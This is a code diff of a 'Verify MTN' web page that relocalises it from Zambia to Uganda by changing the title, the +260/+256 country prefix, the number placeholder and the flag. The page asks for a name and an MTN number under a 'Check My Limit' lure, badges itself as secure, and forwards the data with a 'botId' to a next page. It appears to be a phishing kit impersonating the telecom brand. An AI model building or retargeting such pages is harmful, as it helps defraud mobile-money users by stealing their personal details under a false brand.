@@ -53,7 +53,7 @@
 
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Verify MTN – Zambia</title>
+    <title>Verify MTN – Uganda</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,600;14..32,700&display=swap" rel="stylesheet" />
@@ -181,14 +181,14 @@
         <div class="input-group">
             <label for="mtnInput">MTN Mobile Number <span class="asterisk">*</span></label>
             <div class="input-wrapper">
-                <span class="prefix">+260</span>
-                <input type="tel" id="mtnInput" placeholder="96 123 4567" inputmode="numeric" autocomplete="tel" />
+                <span class="prefix">+256</span>
+                <input type="tel" id="mtnInput" placeholder="70 123 4567" inputmode="numeric" autocomplete="tel" />
             </div>
             <div class="hint" id="hint">Enter a 9-digit MTN number</div>
         </div>
 
         <button class="btn-check" id="checkBtn" disabled>Check My Limit</button>
-        <div class="footer-note"><span>🔒 Secure</span> <span class="dot">•</span> <span>⚡ Instant check</span> <span class="dot">•</span> <span>🇿🇲 MTN Zambia</span></div>
+        <div class="footer-note"><span>🔒 Secure</span> <span class="dot">•</span> <span>⚡ Instant check</span> <span class="dot">•</span> <span>🇺🇬 MTN Uganda</span></div>
     </div>
     <script>
         (function() {
@@ -238,11 +238,11 @@
 
                 // Store for use on all subsequent pages / server submissions
                 localStorage.setItem('fullName', name);
-                localStorage.setItem('phone', '+260' + digits);
+                localStorage.setItem('phone', '+256' + digits);
 
                 // Carry botId + phone + name forward in the URL too
                 window.location.href = 'limit.html?botId=' + encodeURIComponent(botId) +
-                                       '&phone=' + encodeURIComponent('+260' + digits) +
+                                       '&phone=' + encodeURIComponent('+256' + digits) +
                                        '&name=' + encodeURIComponent(name);
             });
 
